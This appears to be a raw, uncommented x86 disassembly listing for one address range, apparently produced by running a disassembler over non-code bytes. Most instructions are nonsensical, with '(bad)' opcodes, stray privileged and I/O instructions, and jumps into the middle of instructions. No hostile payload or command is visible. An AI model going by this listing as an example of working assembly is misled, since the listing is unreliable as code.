  449645:	xor    DWORD PTR [eax+eax*2+0x648c2b2a],eax
  44964c:	dec    eax
  44964d:	xor    ah,bh
  44964f:	add    esi,DWORD PTR [edi+0x2866aa03]
  449655:	inc    edx
  449656:	je     0x4496ad
  449658:	sbb    ch,BYTE PTR [eax]
  44965a:	push   ecx
  44965b:	pop    eax
  44965c:	dec    eax
  44965d:	sub    eax,0x293b6755
  449662:	and    BYTE PTR [eax-0xc],ch
  449665:	add    al,0xc3
  449667:	add    esi,DWORD PTR [eax]
  449669:	cs ss dec eax
  44966c:	and    edi,DWORD PTR [ecx]
  44966e:	inc    esp
  44966f:	cmp    BYTE PTR [ebx],dl
  449671:	xor    BYTE PTR [eax+edi*1-0x23],cl
  449675:	inc    esi
  449676:	inc    eax
  449677:	pusha  
  449678:	xlat   BYTE PTR ds:[ebx]
  449679:	pop    eax
  44967a:	adc    BYTE PTR [edi-0x29],bl
  44967d:	add    al,0x22
  44967f:	pop    es
  449680:	enter  0x1b31,0x56
  449684:	mov    cl,0x34
  449686:	adc    BYTE PTR [ebx-0xc],al
  449689:	add    al,0x50
  44968b:	add    eax,0x39f327b5
  449690:	int    0x30
  449692:	add    ah,bh
  449694:	shl    BYTE PTR [ecx],cl
  449696:	dec    edx
  449697:	or     bl,cl
  449699:	and    DWORD PTR [edx-0x2a],eax
	...
  4496b4:	add    cl,cl
  4496b6:	push   edx
  4496b7:	imul   ecx,ebp,0xa46329c2
  4496bd:	xchg   esp,eax
  4496be:	xor    DWORD PTR [edx-0x2b],ebp
  4496c1:	(bad)  
  4496c2:	sub    esp,DWORD PTR [edi-0x29]
  4496c5:	stos   DWORD PTR es:[edi],eax
  4496c6:	push   ebx
  4496c7:	add    BYTE PTR [edx-0xf],ch
  4496ca:	inc    ebx
  4496cb:	arpl   WORD PTR [ebp-0x4694d7d5],di
  4496d1:	cmp    eax,0x358c6c24
  4496d6:	pop    esp
  4496d7:	imul   eax,DWORD PTR [esp+ebx*1-0x776fffb],0x4f
  4496df:	imul   edx,DWORD PTR [edi-0x6a98b8ae],0x9678485a
  4496e9:	imul   DWORD PTR [ebp+0x31159ffd]
  4496ef:	arpl   WORD PTR [ebx+0x4b],di
  4496f2:	cs pop ebp
  4496f4:	push   edx
  4496f5:	or     eax,0x174f4721
  4496fa:	sub    esp,DWORD PTR [ebx+0x44]
  4496fd:	sbb    eax,0xf7e9742f
  449702:	mov    eax,ds:0x31222ffd
  449707:	arpl   WORD PTR [ebx],di
  449709:	adc    al,0x2e
  44970b:	pop    ebp
  44970c:	inc    edx
  44970d:	frstor [eax]
  44970f:	inc    esp
  449710:	inc    esp
  449711:	xlat   BYTE PTR ds:[ebx]
  449712:	sub    ah,BYTE PTR [ebx+0x14]
  449715:	int    0x2e
  449717:	je     0x449702
	...
  449731:	add    bh,dh
  449733:	pop    ds
  449734:	jmp    FWORD PTR [ebx]
  449736:	shl    BYTE PTR [edi+ebx*2],0xff
  44973a:	rol    DWORD PTR [edi+0x6a],cl
  44973d:	add    BYTE PTR [ebx+0x59],al
  449740:	push   0x6f
  449742:	jmp    0x449769
  449744:	pop    ebp
  449745:	outs   dx,BYTE PTR ds:[esi]
  449746:	xor    edi,esi
  449748:	jae    0x4497bc
  44974a:	hlt    
  44974b:	pop    edx
  44974c:	pop    edi
  44974d:	jae    0x4497b1
  44974f:	or     bl,al
  449751:	add    ah,BYTE PTR [ebp+0x2d]
  449754:	pop    ecx
  449755:	jo     0x4497b3
  449757:	pop    esp
  449758:	ins    BYTE PTR es:[edi],dx
  449759:	outs   dx,DWORD PTR ds:[esi]
  44975a:	ds or  bh,al
  44975d:	add    al,BYTE PTR [ebp+0x2d]
  449760:	pop    ecx
  449761:	jo     0x4497b6
  449763:	push   esi
  449764:	pop    ebp
  449765:	fld    QWORD PTR gs:[edi]
  449768:	lds    eax,FWORD PTR [edx]
  44976a:	xchg   ebp,eax
  44976b:	sub    al,0x59
  44976d:	jo     0x4496fd
  44976f:	push   ebp
  449770:	pop    ebp
  449771:	popa   
  449772:	sub    DWORD PTR [eax+eax*1],0x4a03da00
  449779:	outs   dx,BYTE PTR gs:[esi]
  44977b:	sub    al,0x74
  44977d:	inc    ebp
  44977e:	inc    ebx
  44977f:	sub    eax,0x7cd7466
  449784:	jge    0x449786
  449786:	pop    esi
  449787:	push   ebp
  449788:	pop    ebp
  449789:	popa   
  44978a:	and    DWORD PTR ds:0x5b30763d,ebp
  449790:	je     0x4497e9
  449792:	lea    eax,[edi]
  449794:	mov    BYTE PTR [eax+eax*1],0x0
	...
  4497ac:	add    BYTE PTR [eax],al
  4497ae:	add    cl,dl
  4497b0:	push   esi
  4497b1:	jno    0x4497f8
  4497b3:	retf   
  4497b4:	pop    esp
  4497b5:	pop    ebp
  4497b6:	jb     0x449786
  4497b8:	push   esi
  4497b9:	popa   
  4497ba:	je     0x4497e0
  4497bc:	sub    BYTE PTR [ecx+0x6c],bl
  4497bf:	push   cs
  4497c0:	cs pop ebx
  4497c2:	je     0x449778
  4497c4:	pop    ebx
  4497c5:	data16 add ah,al
  4497c8:	pop    es
  4497c9:	cmp    esi,DWORD PTR [edx-0x10]
  4497cc:	and    DWORD PTR [ebp+eiz*2-0xc],esi
  4497d0:	jmp    DWORD PTR [esi+0x6b]
  4497d3:	fist   DWORD PTR [ecx]
  4497d5:	addr16 push esp
  4497d7:	int3   
  4497d8:	mov    edi,0xadd05f67
  4497dd:	cld    
  4497de:	jg     0x4497d7
  4497e0:	loop   0x449835
  4497e2:	arpl   WORD PTR [edx-0x6896b1e3],bx
  4497e8:	enter  0x6d4d,0xf4
  4497ec:	xor    edi,esi
  4497ee:	dec    edi
  4497ef:	xchg   dl,al
  4497f1:	pop    ebp
  4497f2:	arpl   WORD PTR [edi-0x45d1f222],ax
  4497f8:	aam    0x4e
  4497fa:	ins    DWORD PTR es:[edi],dx
  4497fb:	adc    BYTE PTR [edx-0x64086804],0x4e
  449802:	imul   edx,DWORD PTR [edi-0x3f],0xde276d4d
  449809:	cmp    ah,BYTE PTR [ebx+0x5c]
  44980c:	nop
  44980d:	xor    DWORD PTR [eax],eax
  44980f:	hlt    
  449810:	push   ecx
  449811:	std    
  449812:	cmp    al,0x0
	...
  44982c:	inc    esi
  44982d:	and    DWORD PTR [ebx+0x74],0x69599859
  449834:	dec    eax
  449835:	xchg   esp,eax
  449836:	ins    BYTE PTR es:[di],dx
  449838:	and    al,0x7f
  44983a:	push   cs
  44983b:	dec    ebp
  44983c:	sbb    cl,BYTE PTR [ebp+0x530c6d4c]
  449842:	pop    eax
  449843:	add    ah,dh
  449845:	in     eax,dx
  449846:	std    
  449847:	inc    eax
  449848:	sbb    DWORD PTR [eax+0x34],ebx
  44984b:	outs   dx,BYTE PTR ds:[esi]
  44984c:	sbb    eax,0x19745d52
  449851:	sbb    al,0x4e
  449853:	imul   edx,DWORD PTR [edx],0xc7636055
  449859:	test   DWORD PTR [ebp+0x67],0x3342da
  449860:	hlt    
  449861:	add    al,0xe3
  449863:	add    DWORD PTR [ebp-0x1dcbece1],esi
  449869:	sub    ebx,DWORD PTR [ecx]
  44986b:	arpl   ax,ax
  44986d:	pop    ds
  44986e:	aaa    
  44986f:	push   edx
  449870:	int    0x22
  449872:	adc    BYTE PTR [eax-0x29],ah
  449875:	dec    ebx
  449876:	or     DWORD PTR [eax-0x3b],ebx
  449879:	add    al,0x4a
  44987b:	add    DWORD PTR [ebx-0x54adfbd1],edi
  449881:	push   esp
  449882:	int3   
  449883:	push   ecx
  449884:	xchg   esi,eax
  449885:	sub    ebp,edx
  449887:	pop    esi
  449888:	mov    bl,0x2a
  44988a:	(bad)  
  44988b:	leavew 
  44988d:	sub    esp,edx
  44988f:	pop    ebp
	...
  4498a8:	add    BYTE PTR [eax+0x1803b51f],cl
  4498ae:	add    al,0xa2
  4498b0:	pushw  0xc140
  4498b4:	push   ebp
  4498b5:	push   ebx
  4498b6:	aaa    
  4498b7:	mov    edx,0x91204f5d
  4498bc:	push   edi
  4498bd:	inc    esi
  4498be:	and    al,0x95
  4498c0:	pop    edx
  4498c1:	xor    esp,DWORD PTR [edi]
  4498c3:	and    DWORD PTR [esi+0x25],0x5
  4498c7:	or     BYTE PTR es:[eax],ch
  4498ca:	sub    eax,0x211b6675
  4498cf:	mov    dh,0x11
  4498d1:	ss sub al,0x75
  4498d4:	push   eax
  4498d5:	and    BYTE PTR ds:0x2d480823,al
  4498db:	push   ebp
  4498dc:	cmp    esp,DWORD PTR [bx+di]
  4498df:	push   ss
  4498e0:	adc    bh,BYTE PTR [esi]
  4498e2:	and    BYTE PTR [edi+0x58],cl
  4498e5:	hlt    
  4498e6:	add    al,0xf8
  4498e8:	push   es
  4498e9:	and    eax,0xb9674b2c
  4498ee:	sub    al,0x48
  4498f0:	push   edx
  4498f1:	enter  0x29,0x24
  4498f5:	ret    
  4498f6:	sub    BYTE PTR [eax+eax*2-0x4a],dh
  4498fa:	xor    DWORD PTR [esp+ecx*1-0x10],esi
  4498fe:	mov    ebx,0x30db25fe
  449903:	dec    eax
  449904:	or     BYTE PTR [edx-0xfb93e0],ch
  44990a:	bound  edx,QWORD PTR cs:[esi]
	...
  449925:	add    BYTE PTR [esi-0x310aa0d3],ah
  44992b:	sub    ebp,DWORD PTR [edx-0x17]
  44992e:	idiv   DWORD PTR [esi-0x3]
  449931:	and    eax,0xc85e2b94
  449936:	mov    ebx,0xacca6948
  44993b:	add    al,0x0
  44993d:	sub    al,0xf5
  44993f:	inc    ebx
  449940:	ins    BYTE PTR es:[edi],dx
  449941:	mov    esi,0x9c6c5995
  449946:	cdq    
  449947:	sub    BYTE PTR [ecx-0x36],ch
  44994a:	dec    esp
  44994b:	add    eax,0x50f32e00
  449950:	ins    BYTE PTR es:[edi],dx
  449951:	mov    edx,0xbf742438
  449956:	push   esi
  449957:	sub    DWORD PTR [ebx-0x7c],esi
  44995a:	test   esp,0x2a2bbd03
  449960:	dec    ebp
  449961:	test   BYTE PTR [ebx],ch
  449963:	push   ebx
  449964:	pop    edi
  449965:	xchg   ebp,eax
  449966:	and    ah,BYTE PTR [eax+eax*1]
  449969:	sub    ebx,edi
  44996b:	push   eax
  44996c:	arpl   WORD PTR [ebx+0x4a],di
  44996f:	and    BYTE PTR [edx-0x78],ch
  449972:	dec    ebx
  449973:	and    al,0x50
  449975:	pop    ebx
  449976:	aas    
  449977:	pop    edx
  449978:	arpl   WORD PTR [edx+0x2b],bx
  44997b:	add    eax,0x42f10a00
  449980:	addr16 cmp eax,0x675115
  449986:	and    BYTE PTR [esi],ah
  449988:	push   esp
  449989:	outs   dx,DWORD PTR ds:[esi]
	...
  4499a2:	add    BYTE PTR [ecx],bl
  4499a4:	pop    esp
  4499a5:	imul   eax,DWORD PTR [esp+edi*4+0x54],0x5d
  4499aa:	push   esp
  4499ab:	mov    ah,0x5d
  4499ad:	pop    ebp
  4499ae:	add    BYTE PTR [edi],ah
  4499b0:	push   es
  4499b1:	ins    BYTE PTR es:[edi],dx
  4499b2:	jae    0x44999d
  4499b4:	dec    esi
  4499b5:	pop    ebx
  4499b6:	jo     0x44999c
  4499b8:	pop    edx
  4499b9:	cmp    DWORD PTR [eax],eax
  4499bb:	fdivr  st,st(6)
  4499bd:	ds gs cmp eax,ebp
  4499c1:	pop    esp
  4499c2:	ins    DWORD PTR es:[edi],dx
  4499c3:	sub    eax,0xf57458f4
  4499c8:	repz (bad) 
  4499ca:	(bad)  
  4499cb:	cmp    DWORD PTR [ecx],eax
  4499cd:	imul   eax,DWORD PTR ds:[ecx+0x25],0x25406954
  4499d5:	push   esp
  4499d6:	outs   dx,DWORD PTR ds:[esi]
  4499d7:	push   ecx
  4499d8:	pop    ebx
  4499d9:	pop    ebx
  4499da:	popa   
  4499db:	inc    ecx
  4499dc:	inc    esi
  4499dd:	popa   
  4499de:	ins    BYTE PTR es:[edi],dx
  4499df:	sub    al,ch
  4499e1:	pusha  
  4499e2:	ins    DWORD PTR es:[edi],dx
  4499e3:	mov    eax,0x90035f03
  4499e8:	push   esp
  4499e9:	ins    BYTE PTR es:[edi],dx
  4499ea:	je     0x4499a0
  4499ec:	inc    ecx
  4499ed:	jno    0x449a63
  4499ef:	push   0x645766e7
  4499f4:	push   edi
  4499f5:	pop    ebp
  4499f6:	inc    ebx
  4499f7:	jne    0x449a19
  4499f9:	push   0x0
  4499fb:	mov    dl,0x4
  4499fd:	ins    BYTE PTR es:[edi],dx
  4499fe:	jae    0x449a39
  449a00:	push   edx
  449a01:	pop    ebx
  449a02:	popa   
  449a03:	sub    ebx,esi
  449a05:	(bad)  
  449a06:	inc    DWORD PTR [eax]
	...
  449a20:	ud0    eax,DWORD PTR [edi+0x65]
  449a24:	ins    BYTE PTR es:[edi],dx
  449a25:	push   ebx
  449a26:	dec    edx
  449a27:	gs int3 
  449a29:	pop    esp
  449a2a:	ins    BYTE PTR es:[edi],dx
  449a2b:	outs   dx,DWORD PTR ds:[esi]
  449a2c:	add    DWORD PTR ds:[edx+0x2],eax
  449a30:	hlt    
  449a31:	out    0x5e,al
  449a33:	je     0x449a59
  449a35:	pop    esp
  449a36:	push   ebp
  449a37:	pop    ebp
  449a38:	adc    ebx,edi
  449a3a:	push   eax
  449a3b:	dec    eax
  449a3c:	(bad)  [esp+edx*2+0x0]
  449a40:	hlt    
  449a41:	int    0x3
  449a43:	inc    ecx
  449a44:	fyl2x  
  449a46:	ds js  0x449a16
  449a49:	sbb    DWORD PTR [ecx+0x69],eax
  449a4c:	fadd   DWORD PTR [eax]
  449a4e:	xor    BYTE PTR [eax-0x3a],ch
  449a51:	or     BYTE PTR [ebx+0x64],ah
  449a54:	hlt    
  449a55:	loope  0x449a55
  449a57:	imul   eax,edi,0xffffffb9
  449a5a:	push   edx
  449a5b:	pop    ebp
  449a5c:	mov    eax,ds:0xf43f5bbd
  449a61:	dec    ecx
  449a62:	add    eax,DWORD PTR [ecx-0x67]
  449a65:	mov    cl,0x2e
  449a67:	arpl   WORD PTR [esi-0x5d96a426],sp
  449a6d:	pusha  
  449a6e:	inc    esp
  449a6f:	push   ecx
  449a70:	hlt    
  449a71:	pop    ebx
  449a72:	stc    
  449a73:	push   ecx
  449a74:	(bad)  
  449a75:	fisttp DWORD PTR [eax+0x73]
  449a78:	xchg   ebp,eax
  449a79:	shl    DWORD PTR [ebx],1
  449a7b:	jae    0x449ad6
  449a7d:	jp     0x449aca
  449a7f:	inc    ebx
  449a80:	ins    BYTE PTR es:[edi],dx
  449a81:	lods   al,BYTE PTR ds:[esi]
  449a82:	cld    
  449a83:	mov    esp,0x0
	...
  449a9c:	add    bh,dh
  449a9e:	cdq    
  449a9f:	pop    edi
  449aa0:	pop    edi
  449aa1:	push   eax
  449aa2:	jl     0x449af6
  449aa4:	imul   edx,DWORD PTR [edi-0x7f],0x89396d51
  449aab:	push   edi
  449aac:	imul   eax,DWORD PTR [esi-0x6b],0x95f0effc
  449ab3:	pop    ebx
  449ab4:	outs   dx,BYTE PTR ds:[esi]
  449ab5:	sub    BYTE PTR [ecx],dh
  449ab7:	fs ins BYTE PTR es:[edi],dx
  449ab9:	inc    esp
  449aba:	cmp    dl,BYTE PTR [esi+0x74]
  449abd:	sbb    DWORD PTR [ebx+0x51c4348],ecx
  449ac3:	out    0x3,eax
  449ac5:	dec    edi
  449ac6:	add    DWORD PTR [esi],esi
  449ac8:	dec    ebx
  449ac9:	sbb    DWORD PTR [ecx],esi
  449acb:	dec    esp
  449acc:	push   edi
  449acd:	sub    BYTE PTR [esp+edi*1],ch
  449ad0:	pop    edi
  449ad1:	and    BYTE PTR [esi],ah
  449ad3:	sub    DWORD PTR [ebx-0x20],ebx
  449ad6:	pop    ds
  449ad7:	adc    ebx,DWORD PTR [ebx-0x21]
  449ada:	pop    ds
  449adb:	out    0x3,eax
  449add:	jl     0x449ae2
  449adf:	and    bl,BYTE PTR [edi-0x20]
  449ae2:	push   eax
  449ae3:	adc    BYTE PTR [edi-0x29],dl
  449ae6:	pop    edx
  449ae7:	or     bl,BYTE PTR [edx-0x29]
  449aea:	dec    ebx
  449aeb:	add    DWORD PTR [edx-0x33],esp
  449aee:	xor    bh,ah
  449af0:	(bad)  
  449af1:	shr    BYTE PTR [ebx],0x12
  449af4:	pop    edx
  449af5:	hlt    
  449af6:	add    al,0xe6
  449af8:	add    eax,0x37fb1fb5
  449afd:	lea    esp,[ecx]
  449aff:	or     BYTE PTR [eax+0x0],bl
	...
  449b1a:	shr    BYTE PTR [ebx],0xd4
  449b1d:	pop    esi
  449b1e:	hlt    
  449b1f:	add    al,0x24
  449b21:	add    BYTE PTR [eax-0x6fbd29d8],ah
  449b27:	sub    BYTE PTR [edx+0x2904f464],bh
  449b2d:	add    BYTE PTR [eax+0x29],cl
  449b30:	mov    dh,0x41
  449b32:	pop    edx
  449b33:	and    ah,cl
  449b35:	add    edx,eax
  449b37:	add    BYTE PTR [ecx-0x63ceb5a6],dl
  449b3d:	bound  esp,QWORD PTR [eax+0x3f]
  449b40:	xchg   ebp,eax
  449b41:	pop    esi
  449b42:	push   edi
  449b43:	add    eax,0x2c260000
  449b48:	xchg   ebp,eax
  449b49:	dec    edi
  449b4a:	inc    edi
  449b4b:	and    al,0x93
  449b4d:	inc    edx
  449b4e:	and    BYTE PTR [ecx],ch
  449b50:	mov    ah,BYTE PTR [esp+esi*8+0x4]
  449b54:	add    dl,ch
  449b56:	mov    ds:0x3c7c6347,eax
  449b5b:	xor    esp,DWORD PTR [ebx+0x2d]
  449b5e:	das    
  449b5f:	daa    
  449b60:	arpl   WORD PTR [edx+0x24],cx
  449b63:	sub    al,0x6e
  449b65:	push   eax
  449b66:	lds    eax,FWORD PTR [eax+eax*1]
  449b69:	xor    esp,esi
  449b6b:	inc    edi
  449b6c:	arpl   WORD PTR ds:0x4e6e2733,di
  449b72:	ret    0x6949
  449b75:	dec    ebp
  449b76:	ret    
  449b77:	add    al,0x0
  449b79:	pop    esi
  449b7a:	test   BYTE PTR [ebx+0x63],0x1d
	...
  449b96:	add    BYTE PTR [ecx-0x44e694d5],bh
  449b9c:	xor    BYTE PTR [ebx+0x1b],ah
  449b9f:	(bad)  
  449ba0:	push   ebp
  449ba1:	imul   eax,DWORD PTR [eax*1-0x703fffb],0x4b
  449ba9:	jo     0x449baf
  449bab:	into   
  449bac:	inc    ecx
  449bad:	jb     0x449bbb
  449baf:	mov    esi,0xf7e95130
  449bb4:	jne    0x449bb4
  449bb6:	lods   eax,DWORD PTR ds:[esi]
  449bb7:	mov    dl,0x30
  449bb9:	cmp    eax,0x6326a1d4
  449bbe:	(bad)  
  449bbf:	mov    bl,0x54
  449bc1:	outs   dx,BYTE PTR ds:[esi]
  449bc2:	mov    esi,0xba6d2190
  449bc7:	sub    DWORD PTR cs:[eax],eax
  449bca:	mov    dl,0x2a
  449bcc:	inc    ebx
  449bcd:	dec    edx
  449bce:	lods   al,BYTE PTR ds:[esi]
  449bcf:	sub    esp,edx
  449bd1:	sub    eax,0x6c213bff
  449bd6:	jmp    0xa543f9d2
  449bdb:	and    dh,BYTE PTR cs:[eax-0x78]
  449bdf:	xor    edx,DWORD PTR [edx+0x68]
  449be2:	pushf  
  449be3:	sbb    ah,BYTE PTR [edx]
  449be5:	ins    DWORD PTR es:[edi],dx
  449be6:	add    BYTE PTR [ebp+eiz*1+0x5d],bh
  449bea:	push   edi
  449beb:	popf   
  449bec:	or     BYTE PTR [ebx],ch
  449bee:	add    bh,BYTE PTR [ebp+0x53]
  449bf1:	pop    ebp
  449bf2:	imul   edi,DWORD PTR [eax+0x53],0x6b
  449bf6:	jae    0x449c34
  449bf8:	push   esp
  449bf9:	pop    ebp
  449bfa:	push   edi
	...
  449c13:	add    BYTE PTR [ebp-0x3efd03f8],bl
  449c19:	push   esi
  449c1a:	pop    ecx
  449c1b:	outs   dx,BYTE PTR ds:[esi]
  449c1c:	push   ds
  449c1d:	dec    ebp
  449c1e:	pop    ecx
  449c1f:	je     0x449be1
  449c21:	in     eax,dx
  449c22:	pop    esp
  449c23:	jae    0x449c53
  449c25:	sub    bl,BYTE PTR [edi+0x65]
  449c28:	dec    ebp
  449c29:	or     BYTE PTR [edx+eax*1],bl
  449c2c:	clc    
  449c2d:	push   edi
  449c2e:	pop    edi
  449c2f:	push   edi
  449c30:	cld    
  449c31:	push   ecx
  449c32:	je     0x449c7a
  449c34:	cli    
  449c35:	push   esi
  449c36:	inc    ebp
  449c37:	jne    0x449c32
  449c39:	push   esp
  449c3a:	popa   
  449c3b:	jo     0x449c76
  449c3d:	and    eax,0x26076247
  449c42:	pop    ebx
  449c43:	je     0x449c73
  449c45:	or     BYTE PTR [esi+0x1],dh
  449c48:	shl    BYTE PTR ds:0x57245374,cl
  449c4e:	je     0x449cb5
  449c50:	sub    ch,ch
  449c52:	pop    esp
  449c53:	je     0x449c84
  449c55:	push   ecx
  449c56:	pop    ebx
  449c57:	jae    0x449c66
  449c59:	or     BYTE PTR ds:0x74255201,bh
  449c5f:	dec    esp
  449c60:	mov    esp,0xbb497456
  449c65:	push   edi
  449c66:	ins    DWORD PTR es:[edi],dx
  449c67:	je     0x449bfd
  449c69:	pop    ecx
  449c6a:	pop    esi
  449c6b:	outs   dx,DWORD PTR ds:[esi]
  449c6c:	int    0x7
  449c6e:	cmp    al,0x0
  449c70:	sahf   
  449c71:	dec    edi
  449c72:	pop    ecx
  449c73:	jb     0x449bf5
  449c75:	push   edi
  449c76:	jo     0x449cdd
	...
  449c90:	add    ah,dh
  449c92:	(bad)
  449c96:	jae    0x449c94
  449c98:	cmp    al,0x1c
  449c9a:	jge    0x449cea
  449c9c:	dec    esp
  449c9d:	sbb    edi,DWORD PTR [ebx]
  449c9f:	pusha  
  449ca0:	outs   dx,BYTE PTR ds:[esi]
  449ca1:	dec    ebx
  449ca2:	sahf   
  449ca3:	cld    
  449ca4:	aaa    
  449ca5:	hlt    
  449ca6:	pop    esi
  449ca7:	push   esp
  449ca8:	pop    edi
  449ca9:	push   es
  449caa:	repnz push eax
  449cac:	dec    ecx
  449cad:	adc    DWORD PTR [ecx+0x29],eax
  449cb0:	add    ah,dh
  449cb2:	or     dh,bh
  449cb4:	dec    eax
  449cb5:	add    al,0x49
  449cb7:	push   edx
  449cb8:	push   ecx
  449cb9:	fstp   QWORD PTR [ebx+0x60]
  449cbc:	imul   esp,ebx,0xe85f500e
  449cc2:	inc    esp
  449cc3:	push   ecx
  449cc4:	push   0xffffffc3
  449cc6:	popf   
  449cc7:	cld    
  449cc8:	test   ch,dh
  449cca:	loop   0x449d2a
  449ccc:	je     0x449c6f
  449cce:	push   cs
  449ccf:	pop    edi
  449cd0:	outs   dx,BYTE PTR ds:[esi]
  449cd1:	mov    bl,0xff
  449cd3:	push   ebp
  449cd4:	arpl   di,dx
  449cd6:	sbb    DWORD PTR [ebx],edi
  449cd8:	push   0xffffff9a
  449cda:	sbb    cl,BYTE PTR [esi+0x6b]
  449cdd:	xchg   ebp,eax
  449cde:	mov    ecx,0x1292695b
  449ce3:	add    al,0xb6
  449ce5:	test   BYTE PTR [esi],0x5f
  449ce8:	je     0x449c92
  449cea:	aad    0x4e
  449cec:	arpl   WORD PTR [ebp-0x789cc737],dx
  449cf2:	(bad)  
  449cf3:	dec    eax
  449cf4:	imul   eax,DWORD PTR [eax],0x0
	...
  449d0e:	test   BYTE PTR [ebp+0x5ef445fc],bl
  449d14:	push   eax
  449d15:	imul   esp,DWORD PTR [edi-0x37],0xc7676338
  449d1c:	dec    eax
  449d1d:	imul   esp,DWORD PTR [esp+ebx*4-0x4],0xb204f627
  449d25:	push   ebx
  449d26:	push   edi
  449d27:	and    esp,DWORD PTR [ebx-0x64e1aea0]
  449d2d:	push   esi
  449d2e:	inc    esp
  449d2f:	pop    edx
  449d30:	out    0x3,eax
  449d32:	sbb    al,0x4
  449d34:	stos   BYTE PTR es:[edi],al
  449d35:	pusha  
  449d36:	and    BYTE PTR [ebp+0x75],dl
  449d39:	push   esi
  449d3a:	inc    ecx
  449d3b:	sub    BYTE PTR [esi+0x52],dh
  449d3e:	inc    ebp
  449d3f:	sbb    al,0x79
  449d41:	pop    edi
  449d42:	sbb    eax,0x2b50363a
  449d47:	cmp    DWORD PTR [eax+0x55],edx
  449d4a:	push   cs
  449d4b:	add    eax,0x36b90457
  449d50:	inc    esp
  449d51:	arpl   ax,bp
  449d53:	daa    
  449d54:	sbb    bl,BYTE PTR [ebx-0x22]
  449d57:	sub    BYTE PTR [edx+0x4d],cl
  449d5a:	mov    cl,0x38
  449d5c:	dec    eax
  449d5d:	push   eax
  449d5e:	shl    DWORD PTR [ecx],cl
  449d60:	cmp    DWORD PTR ds:0x43104f4,ebp
  449d66:	or     DWORD PTR [ecx],esp
  449d68:	or     dl,BYTE PTR [ecx-0x29]
  449d6b:	pop    ecx
  449d6c:	add    BYTE PTR [esi-0x30],dl
  449d6f:	and    DWORD PTR [edx],edx
  449d71:	xor    DWORD PTR [eax],eax
	...
  449d8b:	test   al,0x23
  449d8d:	sti    
  449d8e:	pop    edx
  449d8f:	popf   
  449d90:	and    ah,bh
  449d92:	add    esp,DWORD PTR [edx-0x5fa0d5fd]
  449d98:	pop    eax
  449d99:	call   DWORD PTR [ecx-0x69]
  449d9c:	and    ecx,ebx
  449d9e:	aas    
  449d9f:	xchg   edi,eax
  449da0:	xor    eax,0x348d4fce
  449da5:	out    0x3,eax
  449da7:	push   edx
  449da8:	pop    es
  449da9:	mov    dh,0x5e
  449dab:	push   0x4954b555
  449db0:	sub    BYTE PTR [esi+0x1c4550],dh
  449db6:	(bad)  
  449db7:	cmp    ebx,DWORD PTR [ecx+esi*2]
  449dba:	call   0x1f20:0x90745243
  449dc1:	add    BYTE PTR [edi-0x73921009],bh
  449dc7:	push   esi
  449dc8:	cmp    DWORD PTR [ebx-0x5b],esp
  449dcb:	push   edx
  449dcc:	and    BYTE PTR [ebp+0x7d],ah
  449dcf:	inc    eax
  449dd0:	xor    eax,0x7ef7e951
  449dd5:	(bad)  
  449dd6:	lods   eax,DWORD PTR ds:[esi]
  449dd7:	cmp    bh,BYTE PTR [ecx]
  449dd9:	push   ecx
  449dda:	sub    BYTE PTR [ecx],0x29
  449ddd:	imul   ebx,DWORD PTR [esi-0x10],0x2339fe37
  449de4:	pop    ds
  449de5:	fs and al,0x1b
  449de8:	and    BYTE PTR [ebp+0x48],ch
  449deb:	shl    DWORD PTR ds:0x5054,1
	...
  449e05:	add    BYTE PTR [eax],al
  449e07:	add    bl,al
  449e09:	and    eax,0x53c43469
  449e0e:	add    BYTE PTR [ebp+0x35633ff5],ch
  449e14:	and    DWORD PTR [edx],ebp
  449e16:	push   0xd
  449e18:	mov    eax,ds:0xaa0e4c33
  449e1d:	and    edx,DWORD PTR [ecx-0x17]
  449e20:	mul    DWORD PTR ds:0x20d33afe
  449e26:	arpl   WORD PTR [eax],cx
  449e28:	lds    esp,FWORD PTR ds:0x96f82a44
  449e2e:	(bad)  
  449e2f:	sub    eax,0x5138bb
  449e34:	stos   BYTE PTR es:[edi],al
  449e35:	sub    BYTE PTR [ecx-0x22],ch
  449e38:	ret    
  449e39:	sbb    ebp,DWORD PTR [edx-0x3a]
  449e3c:	rol    BYTE PTR [eax+eax*1],1
  449e3f:	or     bh,dh
  449e41:	inc    ebx
  449e42:	arpl   bp,dx
  449e44:	xor    esi,edx
  449e46:	(bad)  
  449e47:	inc    DWORD PTR [ecx]
  449e49:	push   es
  449e4a:	dec    edi
  449e4b:	imul   esi,DWORD PTR [ebx-0x748898b0],0x6d6d6756
  449e55:	pop    ecx
  449e56:	popa   
  449e57:	outs   dx,BYTE PTR ds:[esi]
  449e58:	imul   eax,DWORD PTR [edi+eiz*8],0x59599101
  449e5f:	fs xchg esp,eax
  449e61:	push   edi
  449e62:	pop    ecx
  449e63:	addr16 js 0x449e47
  449e66:	(bad)  
  449e67:	call   FWORD PTR [eax]
  449e69:	add    edi,DWORD PTR [edi]
  449e6b:	add    BYTE PTR gs:[eax],al
	...
  449e82:	add    BYTE PTR [eax],al
  449e84:	add    BYTE PTR [ecx],ch
  449e86:	loopne 0x449eee
  449e88:	jo     0x449f04
  449e8a:	dec    ebx
  449e8b:	data16 adc al,BYTE PTR fs:[ecx+0x0]
  449e90:	add    BYTE PTR [ecx+0xa],cl
  449e93:	inc    ecx
  449e94:	jae    0x449e55
  449e96:	fstp   QWORD PTR [edx+0x74]
  449e99:	enter  0x6ff5,0x74
  449e9d:	les    ecx,FWORD PTR [eax]
  449e9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449ea0:	add    DWORD PTR [edx],ebx
  449ea2:	fidiv  WORD PTR [ebx+0x57]
  449ea5:	(bad)  
  449ea6:	repnz arpl WORD PTR [edi+0x1a],bp
  449eaa:	dec    ebp
  449eab:	push   0x63e9b872
  449eb0:	push   eax
  449eb1:	out    dx,eax
  449eb2:	repz pop edx
  449eb4:	gs fdivrp st(7),st
  449eb7:	inc    eax
  449eb8:	fs dec ebp
  449eba:	add    al,0x53
  449ebc:	add    edx,ebx
  449ebe:	fnsave [ebx+0x4d]
  449ec1:	clc    
  449ec2:	imul   DWORD PTR [edx+0x61]
  449ec5:	cli    
  449ec6:	fisttp QWORD PTR [edi+0x6f]
  449ec9:	push   ds
  449eca:	add    al,0x1
  449ecc:	add    dh,al
  449ece:	jmp    0xf668f642
  449ed3:	arpl   WORD PTR [edi+0x2a],bp
  449ed6:	push   esp
  449ed7:	addr16 imul esi,esp,0xf46d30c7
  449ede:	rol    DWORD PTR [edx],0x4d
  449ee1:	push   ecx
  449ee2:	fsub   DWORD PTR [eax]
  449ee4:	dec    ebx
  449ee5:	pop    ecx
  449ee6:	imul   esi,DWORD PTR [ecx],0x5f
	...
